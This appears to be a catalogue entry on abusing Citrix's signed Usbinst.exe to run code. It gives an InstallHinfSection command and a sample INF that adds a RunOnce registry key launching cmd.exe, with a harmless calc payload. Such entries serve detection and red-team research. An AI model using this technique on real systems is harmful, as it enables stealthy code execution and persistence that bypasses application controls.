## Usbinst.exe

* Functions: Execute

```
Usbinst.exe InstallHinfSection "DefaultInstall 128 c:\temp\calc.inf"
 
```

Acknowledgements:
* Pierre-Alexandre Braeken - @pabraeken


Resources:
* https://twitter.com/pabraeken/status/993514357807108096

Full path:
```
C:\Program Files (x86)\Citrix\ICA Client\Drivers64\Usbinst.exe
```

Notes:
calc.inf
```
; DRIVER.INF
; Copyright (c) Microsoft Corporation.  All rights reserved.
 
[Version]
Signature = "$CHICAGO$"
Class=61883
ClassGuid={7EBEFBC0-3200-11d2-B4C2-00A0C9697D17}
Provider=%Msft%
DriverVer=06/21/2006,6.1.7600.16385
 
[DestinationDirs]
DefaultDestDir = 1
 
[DefaultInstall]
AddReg = CalcStart

[CalcStart]
HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,Install,,cmd.exe /c """calc.exe"""
```




 
